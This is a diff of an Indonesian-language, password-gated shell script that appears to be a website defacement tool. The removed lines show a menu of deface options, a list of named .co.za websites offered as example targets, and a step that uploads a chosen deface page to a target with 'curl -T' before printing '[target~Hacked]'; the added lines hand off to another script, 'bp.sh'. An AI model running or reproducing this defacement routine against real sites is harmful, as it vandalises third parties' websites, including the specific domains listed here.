@@ -30,72 +30,11 @@ read p
 if [ $p = "BPDWT" ]
 then
 clear
+cd tul
+sh bp.sh
+exit
 else
 xdg-open https://1theblackpaper.blogspot.com/p/password-tools-dwt.html
 echo Password Salah
 exit
 fi
-echo $green
-figlet BP
-echo $cyan
-echo ----------------------------------------------
-echo 1 Deface Biasa
-echo 2 Deface Dengan SC Deface BP
-echo 3 Install Paket
-echo ----------------------------------------------
-echo  Jawabanmu:
-read f
-if [ $f = "1" ]
-then
-clear
-fi
-
-if [ $f = "2" ]
-then 
-cd tul
-sh b.sh
-exit
-fi
-
-if [ $f = "3" ]
-then 
-cd tul
-sh c.sh
-exit
-fi
-
-
-clear
-echo $green
-echo Simpan SC Di Memory Internal Di Luar Folder
-echo Contoh Target:
-echo $red
-echo "http://colourfactory.co.za"          
-echo $cyan 
-echo "http://chillibitez.co.za"
-echo $red
-echo "http://centraltech.co.za"
-echo $cyan
-echo "http://windmillsandporcupines.co.za"
-echo $red
-echo "http://mpark.co.za"
-echo $cyan
-echo "http://ratia.co.za "
-echo $red
-echo "http://itsengineering.co.za new"
-echo $cyan
-echo "http://uzingela.co.za new"
-echo $green
-echo eksekusi target
-read -p "Target=>"  target
-clear
-echo Simpan SC Di Memory Internal Di Luar Folder
-echo $red
-read -p "Nama Script=>"  script
-echo $cyan
-echo loading..
-cd /sdcard
-curl -T $script $target
-echo $red
-echo [$target~Hacked]
-echo terimakasih $ta telah menggunakan tools ini 
